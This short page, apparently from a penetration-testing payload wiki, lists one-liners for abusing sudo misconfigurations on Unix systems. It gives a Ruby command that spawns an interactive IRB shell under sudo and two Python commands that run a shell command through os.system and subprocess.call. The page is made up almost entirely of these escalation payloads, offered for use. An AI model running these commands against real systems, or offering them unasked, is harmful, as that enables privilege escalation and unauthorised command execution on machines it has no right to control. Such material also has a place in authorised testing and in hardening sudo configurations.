---
description: >-
  This page contains payloads that can be used to abuse sudo misconfigurations
  on a Unix-based system.
---

# Misconfigurations

Ruby

```bash
sudo -u $USER /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
```

Python

```bash
sudo -u $USER /usr/bin/python -c 'import os;os.system("whoami")'
```

```bash
sudo -u $USER /usr/bin/python -c 'from subprocess import call;call("[whoami]")'
```

